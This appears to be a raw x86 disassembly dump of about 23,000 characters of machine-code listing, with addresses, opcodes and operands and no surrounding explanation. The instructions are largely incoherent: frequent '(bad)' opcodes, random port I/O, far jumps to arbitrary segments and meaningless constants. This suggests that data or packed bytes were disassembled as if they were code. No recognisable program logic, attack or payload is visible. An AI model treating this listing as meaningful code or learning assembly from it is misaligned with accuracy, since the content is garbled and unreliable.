  422efc:	xchg   edx,eax
  422efd:	movntq (bad),mm6
  422efe:	out    0xf2,eax
  422f00:	push   cs
  422f01:	cmp    ah,BYTE PTR [edx+0x43]
  422f04:	popf   
  422f05:	dec    edi
  422f06:	mov    ch,0x4
  422f08:	pop    eax
  422f09:	cmp    eax,edx
  422f0b:	sti    
  422f0c:	add    BYTE PTR cs:[edx+0x1521aa19],dl
  422f13:	int3   
  422f14:	retf   
  422f15:	pop    ecx
  422f16:	aam    0xf1
  422f18:	(bad)  
  422f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f1a:	ins    BYTE PTR es:[edi],dx
  422f1b:	mov    BYTE PTR [eax],dl
  422f1d:	or     BYTE PTR [esi-0x24],bh
  422f20:	out    dx,al
  422f21:	jae    0x422f6b
  422f23:	loop   0x422f6b
  422f25:	dec    esi
  422f26:	scas   al,BYTE PTR es:[edi]
  422f27:	xchg   ebx,eax
  422f28:	fs fwait
  422f2a:	adc    eax,0x6c68adb
  422f2f:	xor    eax,0x9d85cdac
  422f34:	ror    bh,cl
  422f36:	mov    ebp,0x7e67dbf5
  422f3b:	lock add eax,0x860233aa
  422f41:	add    al,0xd1
  422f43:	(bad)  
  422f44:	cli    
  422f45:	mov    es,WORD PTR [esi]
  422f47:	pop    esi
  422f48:	outs   dx,BYTE PTR ds:[esi]
  422f49:	imul   DWORD PTR [eax+0x38]
  422f4c:	in     eax,dx
  422f4d:	jge    0x422f60
  422f4f:	sbb    DWORD PTR [esi],eax
  422f51:	xchg   edi,ebp
  422f53:	xor    edi,edi
  422f55:	(bad)  
  422f56:	fidivr WORD PTR [eax+0x27]
  422f59:	jns    0x422f8e
  422f5b:	cld    
  422f5c:	xlat   BYTE PTR ds:[ebx]
  422f5d:	loope  0x422eef
  422f5f:	out    0xd4,al
  422f61:	data16 jns 0x422f10
  422f64:	add    ah,BYTE PTR [eax-0x43b362eb]
  422f6a:	or     DWORD PTR [eax+0x3d846832],ebp
  422f70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f71:	and    edi,esi
  422f73:	or     edx,esi
  422f75:	mov    esi,0x5c5ff7d4
  422f7a:	cmp    eax,0xba1785a1
  422f7f:	mov    esp,0x8e354e93
  422f84:	out    dx,eax
  422f85:	mov    eax,DWORD PTR [edx+0x3c9b8116]
  422f8b:	mov    ds:0x8652237d,al
  422f90:	and    ebx,esp
  422f92:	adc    DWORD PTR [ebp+ebp*8-0xadf82bc],ecx
  422f99:	lods   eax,DWORD PTR ds:[esi]
  422f9a:	lahf   
  422f9b:	shr    BYTE PTR [eax],cl
  422f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f9e:	mov    BYTE PTR es:[edi-0xb],bl
  422fa2:	sar    edi,1
  422fa4:	push   ecx
  422fa5:	fdivr  st,st(2)
  422fa7:	push   ebx
  422fa8:	(bad)  
  422fa9:	or     edx,ebx
  422fab:	dec    ebx
  422fac:	mov    ds:0xdd23ada,eax
  422fb1:	adc    BYTE PTR [edx+ecx*2],dh
  422fb4:	aas    
  422fb5:	sub    eax,0x3c84170c
  422fba:	mov    BYTE PTR [ecx-0x5f],dh
  422fbd:	dec    edx
  422fbe:	pop    eax
  422fbf:	mov    bl,0x97
  422fc1:	fisub  WORD PTR [ecx-0x53]
  422fc4:	and    al,0x38
  422fc6:	bound  eax,QWORD PTR [ebx]
  422fc8:	dec    edx
  422fc9:	sub    eax,0xda4a17df
  422fce:	inc    esi
  422fcf:	mov    al,0xe9
  422fd1:	(bad)  
  422fd2:	push   esp
  422fd3:	add    al,0xae
  422fd5:	push   ds
  422fd6:	jp     0x422fc6
  422fd8:	inc    ebx
  422fd9:	mov    eax,0xf1a4199d
  422fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fdf:	adc    bh,dh
  422fe1:	lods   eax,DWORD PTR ds:[esi]
  422fe2:	xor    eax,0xc8af6bd0
  422fe7:	ret    
  422fe8:	mov    bl,0x9
  422fea:	pavgb  mm0,QWORD PTR [esi-0x2a]
  422fee:	and    esp,esi
  422ff0:	int3   
  422ff1:	imul   edi,DWORD PTR [edi+0x49],0xffffff82
  422ff5:	out    0x42,eax
  422ff7:	(bad)
  422ffa:	push   0xffffffcb
  422ffc:	int3   
  422ffd:	rcr    ah,cl
  422fff:	ret    0x45ab
  423002:	arpl   WORD PTR [ebx],dx
  423004:	xor    dl,BYTE PTR [edi+ebp*8-0x1986011d]
  42300b:	cli    
  42300c:	jae    0x423002
  42300e:	icebp  
  42300f:	daa    
  423010:	push   0xbc1909ba
  423015:	sub    al,0xac
  423017:	pusha  
  423018:	mov    ds:0xc2086494,al
  42301d:	push   es
  42301e:	push   ecx
  42301f:	fst    DWORD PTR [ecx+0x59]
  423022:	in     al,0x18
  423024:	push   ebx
  423025:	pavgb  mm1,QWORD PTR [ecx+0x5d808b63]
  42302c:	mov    ebp,0xd6504691
  423031:	lock outs dx,DWORD PTR ds:[esi]
  423033:	jae    0x422fcb
  423035:	inc    esp
  423036:	mov    ds,esi
  423038:	scas   al,BYTE PTR es:[edi]
  423039:	(bad)  
  42303a:	jne    0x422fd0
  42303c:	ret    0x21d0
  42303f:	mov    dh,0x9a
  423041:	clc    
  423042:	mov    edi,0xbc776746
  423047:	push   esi
  423048:	sub    esp,DWORD PTR [ebp+edi*8+0x55]
  42304c:	jo     0x42306f
  42304e:	call   0x793c:0x4f22e31a
  423055:	add    DWORD PTR ds:0x2e37f0f,0x3c
  42305c:	dec    eax
  42305d:	xor    ebx,DWORD PTR [ebx+ebp*2-0x69b32d3c]
  423064:	add    dl,0x2e
  423067:	sbb    dh,BYTE PTR [ebx]
  423069:	aaa    
  42306a:	icebp  
  42306b:	mov    edi,DWORD PTR [eax+0xe484]
	...
  423079:	add    dl,dh
  42307b:	rol    BYTE PTR ds:0xf6d53751,0xe3
  423082:	test   BYTE PTR [eax],0xec
  423085:	inc    esi
  423086:	les    esp,FWORD PTR [ecx]
  423088:	mov    WORD PTR [eax],es
  42308a:	int3   
  42308b:	stos   BYTE PTR es:[edi],al
  42308c:	add    DWORD PTR [eax],eax
  42308e:	std    
  42308f:	add    DWORD PTR [eax],eax
  423091:	add    BYTE PTR [esi],cl
  423093:	and    eax,0x78ccdfa6
  423098:	js     0x42301e
  42309a:	mov    ebx,0x90365acf
  42309f:	push   eax
  4230a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230a1:	xchg   edx,eax
  4230a2:	adc    eax,0x7f1f0935
  4230a7:	pushf  
  4230a8:	fdivr  DWORD PTR [ebp-0x55bc8d7e]
  4230ae:	jp     0x4230a6
  4230b0:	sub    edi,esi
  4230b2:	jns    0x423110
  4230b4:	(bad)  
  4230b5:	ret    
  4230b6:	outs   dx,BYTE PTR ds:[esi]
  4230b7:	mov    ah,0xd0
  4230b9:	loop   0x423110
  4230bb:	add    ebx,DWORD PTR [edi]
  4230bd:	lea    esi,ds:0xaefab19b
  4230c3:	dec    bl
  4230c5:	dec    ecx
  4230c6:	push   0xe0d920c5
  4230cb:	sbb    al,BYTE PTR [eax]
  4230cd:	out    dx,al
  4230ce:	lods   eax,DWORD PTR ds:[esi]
  4230cf:	outs   dx,DWORD PTR ds:[esi]
  4230d0:	ret    
  4230d1:	sub    eax,DWORD PTR [ecx]
  4230d3:	jle    0x42307a
  4230d5:	push   0x1d
  4230d7:	clc    
  4230d8:	rol    DWORD PTR [esp+ebx*2-0x28696af1],1
  4230df:	arpl   cx,bx
  4230e1:	mov    edi,0x123c2981
  4230e6:	jmp    0x4230f3
  4230e8:	aaa    
  4230e9:	sub    DWORD PTR [eax],0x2b86af26
  4230ef:	push   ebp
  4230f0:	jae    0x423104
  4230f2:	mov    ds:0x60b1fd54,eax
  4230f7:	arpl   WORD PTR [eax-0x60e60a06],bx
  4230fd:	out    dx,al
  4230fe:	xchg   DWORD PTR [ebx-0x6d6863a4],ebp
  423104:	mov    DWORD PTR [edx+0x7353a08e],esi
  42310a:	add    ecx,DWORD PTR [ebx]
  42310c:	adc    bl,ch
  42310e:	arpl   WORD PTR ds:0x3fa4fc00,di
  423114:	add    cl,BYTE PTR [ebp*1+0x5f26accb]
  42311b:	or     DWORD PTR [esi],eax
  42311d:	mov    esi,0x2660b7f8
  423122:	or     eax,ecx
  423124:	std    
  423125:	and    BYTE PTR [esi-0x2a5eedb3],dl
  42312b:	imul   ecx,DWORD PTR [esi-0x6e7a9db7],0xb70f5379
  423135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423136:	sub    al,0x2b
  423138:	mov    ds:0x5c07a1ec,eax
  42313d:	jmp    0x3619c578
  423142:	jmp    0x4aba:0x93040118
  423149:	mov    DWORD PTR [edi-0x3c063ab],ecx
  42314f:	daa    
  423150:	std    
  423151:	add    eax,0xcf4c4122
  423156:	pop    ecx
  423157:	es add bx,cx
  42315b:	push   cs
  42315c:	pop    edx
  42315d:	mov    dh,BYTE PTR [ebx+ebx*1]
  423160:	pop    eax
  423161:	aaa    
  423162:	adc    esi,eax
  423164:	and    esi,DWORD PTR ds:0x9aace78c
  42316a:	jae    0x423152
  42316c:	pop    eax
  42316d:	out    dx,al
  42316e:	stc    
  42316f:	sub    eax,0x8f809328
  423174:	retf   
  423175:	or     DWORD PTR [ebp-0x2b],0x14
  423179:	in     eax,0xc2
  42317b:	in     eax,dx
  42317c:	adc    ah,BYTE PTR [edx]
  42317e:	dec    esi
  42317f:	ds xchg edx,eax
  423181:	(bad)  
  423183:	sahf   
  423184:	pop    ebx
  423185:	mov    ah,0x86
  423187:	push   ds
  423188:	mov    fs,WORD PTR [ecx-0x7f]
  42318b:	pop    edi
  42318c:	sbb    dl,ah
  42318e:	dec    eax
  42318f:	outs   dx,BYTE PTR ds:[esi]
  423190:	cli    
  423191:	xor    al,0xa1
  423193:	aas    
  423194:	jns    0x4231f0
  423196:	jle    0x4231fb
  423198:	in     al,0x8a
  42319a:	sbb    eax,0x490a5b9d
  42319f:	sub    ecx,DWORD PTR [edx+eax*1-0xbaac8d8]
  4231a6:	xor    eax,0x4fed3795
  4231ab:	lea    edi,[ecx+0x19]
  4231ae:	or     al,0x34
  4231b0:	aas    
  4231b1:	and    eax,0xab8e803f
  4231b6:	test   eax,eax
  4231b8:	fistp  WORD PTR [ecx-0x4a]
  4231bb:	inc    eax
  4231bd:	and    ebp,DWORD PTR [ecx]
  4231bf:	dec    esp
  4231c0:	jle    0x4231aa
  4231c2:	into   
  4231c3:	(bad)  
  4231c4:	sub    eax,0xeb1f67f6
  4231c9:	popa   
  4231ca:	xor    al,0xa5
  4231cc:	loope  0x4231ae
  4231ce:	loope  0x42323f
  4231d0:	mov    ch,0x43
  4231d2:	cmp    ah,BYTE PTR [ecx+0x36]
  4231d5:	push   cs
  4231d6:	iret   
  4231d7:	add    DWORD PTR [ebx-0x4ebf4d75],0x1d
  4231de:	xchg   esi,eax
  4231df:	jnp    0x423223
  4231e1:	add    BYTE PTR [eax-0x47e60876],ah
  4231e7:	jmp    0x9cfb:0xcfe955e9
  4231ee:	and    DWORD PTR [esi+0x1e],edx
  4231f1:	retf   0xc81c
  4231f4:	push   0xfffffffd
  4231f6:	fist   WORD PTR [ecx+ebx*4-0x2a]
  4231fa:	sub    BYTE PTR [eax-0x5cb06b1a],0xec
  423201:	clc    
  423202:	xor    al,BYTE PTR [edi]
  423204:	cli    
  423205:	lods   al,BYTE PTR ds:[esi]
  423206:	dec    ebp
  423207:	fadd   DWORD PTR [ebx+eax*8+0x63ed1aff]
  42320e:	jp     0x4231d4
  423210:	and    BYTE PTR [ecx-0x60],cl
  423213:	out    0xa2,al
  423215:	xchg   DWORD PTR [esi],edi
  423217:	ror    ch,1
  423219:	ja     0x423298
  42321b:	int    0x1e
  42321d:	mov    DWORD PTR [eax+0x41],edx
  423220:	add    ebx,ebp
  423222:	retf   
  423223:	dec    ecx
  423224:	inc    ecx
  423225:	es aad 0x2
  423228:	pop    ss
  423229:	mov    eax,ds:0x5f459031
  42322e:	rol    BYTE PTR [edx+0x64],cl
  423231:	(bad)  [edx+0x547ae649]
  423237:	ja     0x4231e8
  423239:	aaa    
  42323a:	sbb    edx,esi
  42323c:	js     0x423276
  42323e:	ror    DWORD PTR [edi+ecx*8-0x3ded0a03],cl
  423245:	pop    esp
  423246:	adc    ecx,DWORD PTR [edx]
  423248:	mov    dh,0xa6
  42324a:	xchg   edi,eax
  42324b:	push   ds
  42324c:	and    BYTE PTR [ebx],0xa0
  42324f:	stos   DWORD PTR es:[edi],eax
  423250:	jno    0x423234
  423252:	test   al,0x99
  423254:	rol    eax,0x13
  423257:	sbb    DWORD PTR [edx-0x4f],edx
  42325a:	push   esp
  42325b:	adc    al,0x8d
  42325d:	mov    edx,0x7511043e
  423262:	ja     0x423215
  423264:	arpl   WORD PTR [esi],sp
  423266:	fbstp  TBYTE PTR [edx+0x6ea13876]
  42326c:	enter  0x69b3,0x2e
  423270:	iret   
  423271:	sbb    al,0x6c
  423273:	mov    dh,0x3c
  423275:	fsub   QWORD PTR [ecx-0x10]
  423278:	fwait
  423279:	emms   
  42327b:	mov    eax,0x8b1546ae
  423280:	adc    eax,DWORD PTR [ecx+0x17ba8242]
  423286:	inc    eax
  423287:	push   eax
  423288:	lods   eax,DWORD PTR ds:[esi]
  423289:	fdiv   QWORD PTR [eax+0x2a3cc404]
	...
  423297:	add    BYTE PTR [eax],al
  423299:	add    BYTE PTR [ebx+0x41],al
  42329c:	popa   
  42329d:	data16 arpl WORD PTR [esi+0x47],sp
  4232a1:	gs push cs
  4232a3:	mov    BYTE PTR [edi-0x37],bh
  4232a6:	push   ebx
  4232a7:	ror    DWORD PTR [eax+0x1acc99d],0x0
  4232ae:	std    
  4232af:	add    DWORD PTR [eax],eax
  4232b1:	add    dl,al
  4232b3:	mov    ch,0x36
  4232b5:	mov    eax,0x6a4fb2b2
  4232ba:	pop    esi
  4232bb:	rcl    DWORD PTR [ebp+ebx*1-0x1c805ed],0xe9
  4232c3:	pop    ebx
  4232c4:	imul   esp,DWORD PTR [eax],0x5e
  4232c7:	ror    BYTE PTR ds:[eax+0x56e39efb],cl
  4232ce:	jae    0x42325c
  4232d0:	jl     0x4232ae
  4232d2:	or     BYTE PTR [ecx-0x47],ah
  4232d5:	mov    fs,WORD PTR [ebp-0x6e7bf7c7]
  4232db:	outs   dx,BYTE PTR ds:[esi]
  4232dc:	(bad)  
  4232dd:	jmp    0x4e2b:0x7cc83a8f
  4232e4:	shr    dl,1
  4232e6:	sbb    DWORD PTR [ebp+0xf],eax
  4232e9:	aam    0x74
  4232eb:	adc    dl,BYTE PTR [ebp+0x7e]
  4232ee:	cwde   
  4232ef:	(bad)  
  4232f0:	mov    edx,0xe43725e7
  4232f5:	in     al,dx
  4232f6:	rol    BYTE PTR [ebp+0x24c55bd3],0x54
  4232fd:	jmp    FWORD PTR [edi+eiz*2+0x69]
  423301:	call   0x68ed78e2
  423306:	repz dec ecx
  423308:	pop    ss
  423309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42330a:	sbb    eax,0xb65f4353
  42330f:	mov    ebx,0xc6f5955
  423314:	and    al,0x4
  423316:	fbstp  TBYTE PTR [ebx]
  423318:	mov    esp,0x523e4ef7
  42331d:	dec    ebp
  42331e:	in     eax,0xcb
  423320:	pop    esp
  423321:	pop    es
  423322:	mov    ebx,0x30c03b54
  423327:	mov    bh,0x83
  423329:	xlat   BYTE PTR ds:[ebx]
  42332a:	sbb    eax,0x7315a670
  42332f:	pop    eax
  423330:	outs   dx,BYTE PTR ds:[esi]
  423331:	pop    ss
  423332:	sbb    al,0x8f
  423334:	sbb    esi,DWORD PTR [edi-0x34]
  423337:	(bad)  
  423338:	mov    dl,0xce
  42333a:	stos   DWORD PTR es:[edi],eax
  42333b:	test   al,0x76
  42333d:	(bad)  
  42333e:	sub    eax,0x9920a310
  423343:	pusha  
  423344:	xor    al,0xf8
  423346:	into   
  423347:	loope  0x4233c3
  423349:	out    0xa8,eax
  42334b:	dec    ebx
  42334c:	in     al,dx
  42334d:	pushf  
  42334e:	lock (bad) [esi+0x3f1f9a29]
  423355:	xor    eax,0x8be24a97
  42335a:	mov    bh,0xc4
  42335c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42335d:	add    ebx,edx
  42335f:	or     DWORD PTR [ecx-0x73],esp
  423362:	lahf   
  423363:	adc    DWORD PTR [eax+0x5a8c31c0],esi
  423369:	lock scas eax,DWORD PTR es:[edi]
  42336b:	popa   
  42336c:	imul   ebx,ecx,0xcd019cbe
  423372:	into   
  423373:	fcomp  QWORD PTR [esi+0x1c77dd56]
  423379:	(bad)  
  42337a:	push   DWORD PTR [edi+0x32]
  42337d:	popf   
  42337e:	in     al,0xa1
  423380:	lahf   
  423381:	pushf  
  423382:	pop    ss
  423383:	jmp    0x83be:0x5f020821
  42338a:	adc    eax,DWORD PTR [edx+0xb8a9fb3]
  423390:	inc    esp
  423391:	mov    esi,0xf725905c
  423396:	mov    edx,0xfebecb84
  42339b:	ret    
  42339c:	push   ds
  42339d:	fld    DWORD PTR [ebp-0xa]
  4233a0:	gs mov esp,0x49eb6fca
  4233a6:	ds dec ebx
  4233a8:	jle    0x423406
  4233aa:	aas    
  4233ab:	pop    ebp
  4233ac:	les    edx,FWORD PTR [edi-0x19f92e5a]
  4233b2:	in     eax,dx
  4233b3:	pop    ds
  4233b4:	dec    esp
  4233b5:	xchg   DWORD PTR [edx+ebx*1],esp
  4233b8:	out    dx,al
  4233b9:	test   eax,0x7d00c621
  4233bf:	dec    ebp
  4233c0:	adc    BYTE PTR [ecx],bh
  4233c2:	in     al,0x9e
  4233c4:	xchg   ebp,eax
  4233c5:	into   
  4233c6:	jge    0x423422
  4233c8:	mov    ebp,0xd61ea63b
  4233cd:	and    eax,0x9ef8f5c0
  4233d2:	div    bh
  4233d4:	cmp    al,0xc9
  4233d6:	push   ss
  4233d7:	jp     0x4233f7
  4233d9:	int    0xfa
  4233db:	mul    DWORD PTR [esi-0x468b95e5]
  4233e1:	add    DWORD PTR [edx-0x65d0e958],ecx
  4233e7:	jg     0x42341d
  4233e9:	fwait
  4233ea:	mov    esi,0x1f390bbd
  4233ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233f0:	jmp    0x4233fe
  4233f2:	cmp    esp,DWORD PTR [esi]
  4233f4:	loope  0x4233ac
  4233f6:	aas    
  4233f7:	call   0xa7271faa
  4233fc:	inc    ebx
  4233fd:	mov    es,WORD PTR [esi+0x6dd34b6c]
  423403:	sub    edx,DWORD PTR [eax]
  423405:	call   0xdb3fa13b
  42340a:	or     al,0x46
  42340c:	xor    eax,0x2f29453d
  423411:	pop    es
  423412:	sbb    edx,DWORD PTR [esi-0x8]
  423415:	mov    DWORD PTR [edx+eax*4],esi
  423418:	inc    esi
  423419:	cmp    eax,esi
  42341b:	test   BYTE PTR [esi-0x78],bl
  42341e:	mov    WORD PTR [esi],gs
  423420:	push   es
  423421:	(bad)  
  423422:	pop    esp
  423423:	lods   al,BYTE PTR ds:[esi]
  423424:	mov    ebx,0xa5bf076
  423429:	in     eax,dx
  42342a:	call   0x73b5:0x81de690f
  423431:	jns    0x42340f
  423433:	or     DWORD PTR [esi*8+0x6e80e57e],eax
  42343a:	(bad)  
  42343b:	adc    eax,DWORD PTR es:[ecx]
  42343e:	mov    bl,0xf2
  423440:	sub    BYTE PTR [esi+ebx*1+0x77f1b6c4],al
  423447:	ror    DWORD PTR [ebp-0x3e9e0584],1
  42344d:	sub    eax,0xa1731d04
  423452:	jbe    0x423437
  423454:	fldenv [eax+0x3]
  423457:	or     BYTE PTR [edi-0x39],cl
  42345a:	jo     0x423417
  42345c:	inc    edx
  42345d:	xor    ebp,DWORD PTR [edx-0x59f62d7c]
  423463:	fnstenv [ebx+ebx*8+0xa2af9b5]
  42346a:	xor    bl,BYTE PTR [esi]
  42346c:	push   edx
  42346d:	mov    esp,0xb6853434
  423472:	dec    edx
  423473:	pop    edx
  423474:	adc    al,0x8d
  423476:	imul   esp,DWORD PTR [ebp+0x33],0xaf7aa64a
  42347d:	pop    es
  42347e:	mov    bl,0x52
  423480:	push   esi
  423481:	sbb    esi,DWORD PTR [eax-0x73acb1aa]
  423487:	push   0x62
  423489:	in     al,0x62
  42348b:	inc    eax
  42348c:	in     al,0x5f
  42348e:	cmp    esi,DWORD PTR [edx]
  423490:	fwait
  423491:	inc    ebp
  423492:	lahf   
  423493:	inc    ebp
  423494:	mov    dl,0xae
  423496:	clc    
  423497:	mov    ds:0xb87defcb,eax
  42349c:	push   edx
  42349d:	in     al,dx
  42349e:	adc    ebx,ebp
  4234a0:	cmp    al,BYTE PTR [edx+ebx*1+0x3836cccf]
  4234a7:	xor    edi,edi
  4234a9:	cli    
  4234aa:	inc    ecx
  4234ab:	add    DWORD PTR [ebx+0x999a],0x0
  4234b5:	add    BYTE PTR [eax],al
  4234b7:	add    BYTE PTR [eax],al
  4234b9:	add    BYTE PTR [ebx-0xce42c16],cl
  4234bf:	cmp    ecx,ebx
  4234c1:	cli    
  4234c2:	cmp    dh,bl
  4234c4:	adc    BYTE PTR [ebx],dl
  4234c6:	xchg   ebp,eax
  4234c7:	cdq    
  4234c8:	loopne 0x423521
  4234ca:	(bad)  
  4234cb:	scas   al,BYTE PTR es:[edi]
  4234cc:	add    DWORD PTR [eax],eax
  4234ce:	std    
  4234cf:	add    DWORD PTR [eax],eax
  4234d1:	add    BYTE PTR [edi-0x28],ch
  4234d4:	mov    DWORD PTR [edx-0x4],ebx
  4234d7:	xor    al,0xa4
  4234d9:	xchg   esi,eax
  4234da:	lods   al,BYTE PTR ds:[esi]
  4234db:	jnp    0x423539
  4234dd:	jecxz  0x423515
  4234df:	cwde   
  4234e0:	add    BYTE PTR [esi+0x221b786a],ah
  4234e6:	mov    ds:0xab780b16,al
  4234eb:	sbb    eax,DWORD PTR [edx]
  4234ed:	inc    ecx
  4234ee:	mov    eax,0xe46ec1dc
  4234f3:	mov    esi,0xa6e6a3e5
  4234f8:	mov    bh,0x9b
  4234fa:	lds    ebx,FWORD PTR [eax-0x7f]
  4234fd:	dec    ebx
  4234fe:	icebp  
  4234ff:	pop    edx
  423500:	imul   edi,DWORD PTR [eax],0xffffffe1
  423503:	or     BYTE PTR [ebp-0x7c1e7746],ch
  423509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42350a:	mov    ecx,0xb5a7eb2a
  42350f:	lock mov ecx,0x2b75352b
  423515:	int3   
  423516:	mov    WORD PTR [ecx+ecx*1],?
  423519:	in     al,dx
  42351a:	add    DWORD PTR [eax+0x2c],ebp
  42351d:	jg     0x4234b3
  42351f:	or     BYTE PTR [edx],bh
  423521:	push   eax
  423522:	inc    esp
  423523:	std    
  423524:	data16 mov WORD PTR [edi+0x44e352af],gs
  42352b:	xchg   edi,eax
  42352c:	jb     0x4234b3
  42352e:	push   ecx
  42352f:	clc    
  423530:	and    BYTE PTR [edx-0x3917e455],bh
  423536:	movzx  ebx,BYTE PTR [edx+esi*4-0x70]
  42353b:	jns    0x423588
  42353d:	xor    edi,eax
  42353f:	aas    
  423540:	xor    DWORD PTR [esi],ebx
  423542:	out    dx,al
  423543:	in     al,dx
  423544:	xor    al,0x72
  423546:	cli    
  423547:	lea    ebx,[edi+0x6c7d3d90]
  42354d:	lahf   
  42354e:	lds    esi,FWORD PTR [esi+0x33f628f4]
  423554:	jns    0x423564
  423556:	into   
  423557:	xor    eax,esp
  423559:	in     eax,0xa5
  42355b:	loopne 0x42352e
  42355d:	mov    dh,0x11
  42355f:	pop    edi
  423560:	and    bl,dh
  423562:	and    edi,DWORD PTR [ecx+0x7e]
  423565:	sbb    dl,al
  423567:	fmul   QWORD PTR ds:0xff837a70
  42356d:	add    esi,ebx
  42356f:	leave  
  423570:	out    dx,al
  423571:	xor    BYTE PTR [eax],0x52
  423574:	or     esp,DWORD PTR [ebp-0x2cd7f151]
  42357a:	in     eax,dx
  42357b:	hlt    
  42357c:	or     BYTE PTR [ebx],bh
  42357e:	add    ebp,ebx
  423580:	scas   eax,DWORD PTR es:[edi]
  423581:	nop
  423582:	cmp    al,0x32
  423584:	pop    eax
  423585:	mov    ah,0xc8
  423587:	inc    ecx
  423588:	pop    ecx
  423589:	shl    DWORD PTR [ebx],0x1f
  42358c:	pop    DWORD PTR [esi+0x33]
  42358f:	mov    eax,gs
  423591:	int3   
  423592:	nop
  423593:	ins    BYTE PTR es:[edi],dx
  423594:	xor    al,0x66
  423596:	test   eax,0x875d1d8a
  42359b:	pop    esi
  42359c:	inc    ecx
  42359d:	nop
  42359e:	xchg   esi,eax
  42359f:	test   esp,eax
  4235a1:	out    dx,eax
  4235a2:	mov    WORD PTR [edi-0x63],es
  4235a5:	loopne 0x4235ec
  4235a7:	pop    ebp
  4235a8:	push   es
  4235a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235aa:	xchg   esp,eax
  4235ab:	xchg   edx,eax
  4235ac:	jo     0x42358f
  4235ae:	das    
  4235af:	fimul  WORD PTR [ecx-0x56806874]
  4235b5:	ret    0x4b4f
  4235b8:	add    al,0xc4
  4235ba:	lahf   
  4235bb:	mov    WORD PTR [ecx-0x8],es
  4235be:	clc    
  4235bf:	call   0x6a2c:0xe44807d4
  4235c6:	inc    edi
  4235c7:	addr16 ja 0x4235e2
  4235ca:	or     dl,bl
  4235cc:	and    DWORD PTR [edi],esp
  4235ce:	icebp  
  4235cf:	sbb    edx,DWORD PTR [eax+esi*1]
  4235d2:	jo     0x4235a7
  4235d4:	push   cs
  4235d5:	and    ebx,DWORD PTR [esi]
  4235d7:	repz sub al,0x35
  4235da:	xchg   esp,eax
  4235db:	pop    esp
  4235dc:	mov    dl,0xb0
  4235de:	aas    
  4235df:	jmp    0x4235dd
  4235e1:	push   0x498ed397
  4235e6:	(bad)  
  4235e8:	pop    ebx
  4235e9:	cmp    DWORD PTR [ebx],0xd81ef737
  4235ef:	sbb    ah,BYTE PTR [ecx-0x2]
  4235f2:	int    0xcb
  4235f4:	mov    ecx,0xa1765464
  4235f9:	cs inc edi
  4235fb:	enter  0xc027,0xa9
  4235ff:	ud0    edi,DWORD PTR [edi-0x6c]
  423603:	(bad)  
  423604:	out    dx,al
  423605:	daa    
  423606:	sbb    eax,0x835ed59f
  42360b:	lea    esp,[esi-0x6d]
  42360e:	test   BYTE PTR [edx-0x3aa3e264],ah
  423614:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423615:	pop    edi
  423616:	pop    ebp
  423617:	add    BYTE PTR [ebp-0x7367d253],ch
  42361d:	fldpi  
  42361f:	and    edx,ebx
  423621:	mov    edx,0xfc843c11
  423626:	fisttp DWORD PTR ds:0xe9e4d73c
  42362c:	mov    dh,0x59
  42362e:	out    dx,eax
  42362f:	sbb    DWORD PTR [edx+0x56c5ec6e],ecx
  423635:	inc    edi
  423636:	iret   
  423637:	sti    
  423638:	xchg   bh,bl
  42363a:	call   0xe41ae8b0
  42363f:	add    cl,BYTE PTR [edx]
  423641:	mov    eax,0xbb3190bd
  423646:	xchg   esi,eax
  423647:	or     ah,BYTE PTR ds:0x89549110
  42364d:	stos   DWORD PTR es:[edi],eax
  42364e:	jae    0x423673
  423650:	jae    0x42366b
  423652:	idiv   BYTE PTR [eax+0x4a725285]
  423658:	jle    0x42369e
  42365a:	test   eax,0xb5d6bba1
  42365f:	mov    ah,0x81
  423661:	out    dx,eax
  423662:	rcl    BYTE PTR [esi-0xd],1
  423665:	(bad)  [esi+eax*8+0x22a014df]
  42366c:	out    dx,al
  42366d:	push   0x7d8c2999
  423672:	iret   
  423673:	push   cs
  423674:	cmp    esp,DWORD PTR [ebp+0x1d]
  423677:	jmp    FWORD PTR [esi+0x72]
  42367a:	jmp    0x2f180900
  42367f:	dec    esi
  423680:	iret   
  423681:	pusha  
  423682:	add    bh,BYTE PTR [esi+0x1b82534a]
  423688:	test   al,0x88
  42368a:	call   0x7f97456b
  42368f:	add    DWORD PTR [ebp-0x286b8dd0],ebx
  423695:	dec    edx
  423696:	inc    edi
  423697:	pop    edx
  423698:	inc    edx
  423699:	inc    edi
  42369a:	icebp  
  42369b:	popf   
  42369c:	out    0xf0,al
  42369e:	inc    eax
  42369f:	fiadd  DWORD PTR ds:0x9d097b79
  4236a5:	adc    al,0x36
  4236a7:	aaa    
  4236a8:	cmc    
  4236a9:	cld    
  4236aa:	mov    al,ds:0x8180be1
  4236af:	jns    0x423632
  4236b1:	fidiv  DWORD PTR [eax]
  4236b3:	jae    0x423720
  4236b5:	mov    dl,0xa3
  4236b7:	inc    esi
  4236b8:	jb     0x423647
  4236ba:	lods   al,BYTE PTR ds:[esi]
  4236bb:	push   0x77599fa6
  4236c0:	adc    DWORD PTR [ecx+0x25],ecx
  4236c3:	stos   DWORD PTR es:[edi],eax
  4236c4:	je     0x4236e7
  4236c6:	mov    esi,0xeb7e55bd
  4236cb:	push   esp
  4236cc:	mov    ah,dl
  4236ce:	pop    esp
	...
  4236d7:	add    BYTE PTR [eax],al
  4236d9:	add    dl,dl
  4236db:	and    dl,BYTE PTR [esi-0x21410966]
  4236e1:	push   0x61
  4236e3:	push   cs
  4236e4:	cmp    DWORD PTR [eax],esi
  4236e6:	repnz mov al,0xe
  4236e9:	loop   0x4236ae
  4236eb:	mov    al,0x1
  4236ed:	add    ch,bh
  4236ef:	add    DWORD PTR [eax],eax
  4236f1:	add    dl,cl
  4236f3:	add    cl,bl
  4236f5:	mov    cl,0x15
  4236f7:	and    eax,DWORD PTR [esi+ecx*1+0x67]
  4236fb:	into   
  4236fc:	adc    DWORD PTR [eax],0x71
  4236ff:	outs   dx,BYTE PTR ds:[esi]
